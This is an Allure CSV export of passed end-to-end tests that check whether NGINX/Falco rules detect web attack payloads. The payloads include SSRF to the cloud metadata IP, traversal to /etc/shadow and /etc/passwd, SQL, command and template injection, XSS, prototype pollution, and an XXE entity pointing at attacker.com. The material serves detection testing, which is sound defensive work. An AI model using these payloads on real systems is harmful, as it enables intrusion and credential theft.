"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_CLOUD_007` |
| **Name** | AWS IMDSv2 Hostname Metadata Access |
| **Category** | SSRF |
| **Subcategory** | cloud_metadata |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `http://169.254.169.254/latest/meta-data/hostname`
- **Encoded**: `http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fhostname`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~9000ms
- **Timestamp**: 13:45:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_007-1771076704347-p3tnyc pattern_id=SSRF_CLOUD_007 uri=/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fhostname client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_007-1771076704347-p3tnyc pattern_id=SSRF_CLOUD_007 uri=/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fhostname client=127.0.0.1

**Falco Log Entry**:
```
13:45:04.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_007-1771076704347-p3tnyc pattern_id=SSRF_CLOUD_007 uri=/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fhostname client=127.0.0.1
```","2","test_e2e_with_logs[429_SSRF_CLOUD_007]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_002` |
| **Name** | Shadow file access via path traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../etc/shadow`
- **Encoded**: `../../etc/shadow`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 13:43:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1771076634335-vd66w pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1771076634335-vd66w pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1

**Falco Log Entry**:
```
13:43:54.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1771076634335-vd66w pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1
```","1","test_e2e_with_logs[245_PATH_DOT_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_015` |
| **Name** | Python YAML Object Instantiation |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `!!python/object:os.system`
- **Encoded**: `!!python/object:os.system`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 13:44:48.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Deserialization attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_015-1771076688345-hk5dsop pattern_id=PICKLE_DESER_015 uri=/?q=!!python/object:os.system client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_015-1771076688345-hk5dsop pattern_id=PICKLE_DESER_015 uri=/?q=!!python/object:os.system client=127.0.0.1

**Falco Log Entry**:
```
13:44:48.000000000: Critical [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_015-1771076688345-hk5dsop pattern_id=PICKLE_DESER_015 uri=/?q=!!python/object:os.system client=127.0.0.1
```","2","test_e2e_with_logs[463_PICKLE_DESER_015]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_BOLA_002` |
| **Name** | BOLA User Profile v2 Enumeration |
| **Category** | API_SECURITY |
| **Subcategory** | bola |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/api/v2/users/2/profile`
- **Encoded**: `%2Fapi%2Fv2%2Fusers%2F2%2Fprofile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 13:44:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_BOLA_002-1771076681338-7t3khu pattern_id=API_BOLA_002 uri=/?q=%2Fapi%2Fv2%2Fusers%2F2%2Fprofile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_002-1771076681338-7t3khu pattern_id=API_BOLA_002 uri=/?q=%2Fapi%2Fv2%2Fusers%2F2%2Fprofile client=127.0.0.1

**Falco Log Entry**:
```
13:44:41.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_002-1771076681338-7t3khu pattern_id=API_BOLA_002 uri=/?q=%2Fapi%2Fv2%2Fusers%2F2%2Fprofile client=127.0.0.1
```","1","test_e2e_with_logs[410_API_BOLA_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_008` |
| **Name** | MySQL GTID_SUBSET error injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND GTID_SUBSET(version(),1) --`
- **Encoded**: `%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 13:44:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=SQLI_ERROR_008-1771076646887-tkg0j pattern_id=SQLI_ERROR_008 uri=/?q=%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20-- client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=SQLI_ERROR_008-1771076646887-tkg0j pattern_id=SQLI_ERROR_008 uri=/?q=%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20-- client=127.0.0.1

**Falco Log Entry**:
```
13:44:06.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=SQLI_ERROR_008-1771076646887-tkg0j pattern_id=SQLI_ERROR_008 uri=/?q=%27%20AND%20GTID_SUBSET%28version%28%29%2C1%29%20-- client=127.0.0.1
```","2","test_e2e_with_logs[069_SQLI_ERROR_008]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_BASIC_003` |
| **Name** | Triple parent directory traversal |
| **Category** | PATH |
| **Subcategory** | basic_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../`
- **Encoded**: `../../../`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~81000ms
- **Timestamp**: 13:43:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1771076632330-xd7qu9 pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1771076632330-xd7qu9 pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1

**Falco Log Entry**:
```
13:43:52.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1771076632330-xd7qu9 pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1
```","2","test_e2e_with_logs[236_PATH_BASIC_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_003` |
| **Name** | Hosts file access via path traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/hosts`
- **Encoded**: `../../../etc/hosts`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 13:43:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1771076634836-ui0tw pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1771076634836-ui0tw pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1

**Falco Log Entry**:
```
13:43:54.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1771076634836-ui0tw pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1
```","2","test_e2e_with_logs[246_PATH_DOT_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_NEST_001` |
| **Name** | Nested dollar-paren |
| **Category** | CMDINJ |
| **Subcategory** | nested_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$($(echo whoami))`
- **Encoded**: `%24(%24(echo%20whoami))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 13:44:19.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_NEST_001-1771076659378-yjwgjk pattern_id=CMD_NEST_001 uri=/?q=%24(%24(echo%20whoami)) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_NEST_001-1771076659378-yjwgjk pattern_id=CMD_NEST_001 uri=/?q=%24(%24(echo%20whoami)) client=127.0.0.1

**Falco Log Entry**:
```
13:44:19.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_NEST_001-1771076659378-yjwgjk pattern_id=CMD_NEST_001 uri=/?q=%24(%24(echo%20whoami)) client=127.0.0.1
```","2","test_e2e_with_logs[343_CMD_NEST_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_TWIG_001` |
| **Name** | Twig file read |
| **Category** | SSTI |
| **Subcategory** | twig |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{{""/etc/passwd""|file_excerpt(1,30)}}`
- **Encoded**: `%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 13:44:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=SSTI_TWIG_001-1771076670838-62kxoe pattern_id=SSTI_TWIG_001 uri=/?q=%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=SSTI_TWIG_001-1771076670838-62kxoe pattern_id=SSTI_TWIG_001 uri=/?q=%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
13:44:30.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=SSTI_TWIG_001-1771076670838-62kxoe pattern_id=SSTI_TWIG_001 uri=/?q=%7B%7B%22%2Fetc%2Fpasswd%22%7Cfile_excerpt(1%2C30)%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[622_SSTI_TWIG_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_011` |
| **Name** | Basic pipe with id command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|id`
- **Encoded**: `%7Cid`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 13:44:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1771076641339-vyyu1i pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1771076641339-vyyu1i pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1

**Falco Log Entry**:
```
13:44:01.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1771076641339-vyyu1i pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1
```","2","test_e2e_with_logs[315_CMD_BASIC_011]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_007` |
| **Name** | SVG script href attribute |
| **Category** | XSS |
| **Subcategory** | bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<svg><script href=data:,alert('XSS') />`
- **Encoded**: `%3Csvg%3E%3Cscript%20href%3Ddata%3A%2Calert('XSS')%20%2F%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 13:44:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_007-1771076646873-2p0cr pattern_id=XSS_BYPASS_007 uri=/?q=%3Csvg%3E%3Cscript%20href%3Ddata%3A%2Calert('XSS')%20%2F%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_007-1771076646873-2p0cr pattern_id=XSS_BYPASS_007 uri=/?q=%3Csvg%3E%3Cscript%20href%3Ddata%3A%2Calert('XSS')%20%2F%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:06.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_007-1771076646873-2p0cr pattern_id=XSS_BYPASS_007 uri=/?q=%3Csvg%3E%3Cscript%20href%3Ddata%3A%2Calert('XSS')%20%2F%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[144_XSS_BYPASS_007]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_BLIND_001` |
| **Name** | Blind XXE with External DTD |
| **Category** | XXE |
| **Subcategory** | blind_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://attacker.com/xxe"">]>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 13:44:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1771076655337-zy78ke pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1771076655337-zy78ke pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1

**Falco Log Entry**:
```
13:44:15.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_BLIND_001-1771076655337-zy78ke pattern_id=XXE_BLIND_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fxxe%22%3E%5D%3E client=127.0.0.1
```","2","test_e2e_with_logs[398_XXE_BLIND_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_005` |
| **Name** | outerHTML DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `outerHTML='<script>alert(""DOM"")</script>'`
- **Encoded**: `outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 13:44:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_005-1771076641359-7k7hl7 pattern_id=XSS_DOM_005 uri=/?q=outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_005-1771076641359-7k7hl7 pattern_id=XSS_DOM_005 uri=/?q=outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:01.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_005-1771076641359-7k7hl7 pattern_id=XSS_DOM_005 uri=/?q=outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[154_XSS_DOM_005]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ENC_001` |
| **Name** | URL encoded dot-dot-slash |
| **Category** | PATH |
| **Subcategory** | encoded_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%2e%2e%2fetc/passwd`
- **Encoded**: `%252e%252e%252fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 13:44:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_001-1771076641351-3j9rx pattern_id=PATH_ENC_001 uri=/?q=%252e%252e%252fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_001-1771076641351-3j9rx pattern_id=PATH_ENC_001 uri=/?q=%252e%252e%252fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
13:44:01.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_001-1771076641351-3j9rx pattern_id=PATH_ENC_001 uri=/?q=%252e%252e%252fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[254_PATH_ENC_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_002` |
| **Name** | URL encoded AND operator with ls |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%26%26%20ls%20-la`
- **Encoded**: `%2526%2526%2520ls%2520-la`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 13:44:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1771076653866-4ookgn pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1771076653866-4ookgn pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:13.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_ENC_002-1771076653866-4ookgn pattern_id=CMD_ENC_002 uri=/?q=%2526%2526%2520ls%2520-la client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[332_CMD_ENC_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_PROTO_002` |
| **Name** | Prototype Pollution via Constructor |
| **Category** | API_SECURITY |
| **Subcategory** | prototype_pollution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{""constructor"":{""prototype"":{""isAdmin"":true}}}`
- **Encoded**: `%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 13:44:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_PROTO_002-1771076682842-gc4bz pattern_id=API_PROTO_002 uri=/?q=%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_002-1771076682842-gc4bz pattern_id=API_PROTO_002 uri=/?q=%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
13:44:42.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_002-1771076682842-gc4bz pattern_id=API_PROTO_002 uri=/?q=%7B%22constructor%22%3A%7B%22prototype%22%3A%7B%22isAdmin%22%3Atrue%7D%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[591_API_PROTO_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_006` |
| **Name** | Numeric comparison injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1 AND 1>0`
- **Encoded**: `1%20AND%201%3E0`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~81000ms
- **Timestamp**: 13:43:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1771076632856-zyaafr pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1771076632856-zyaafr pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:43:52.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1771076632856-zyaafr pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[037_SQLI_BOOL_006]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
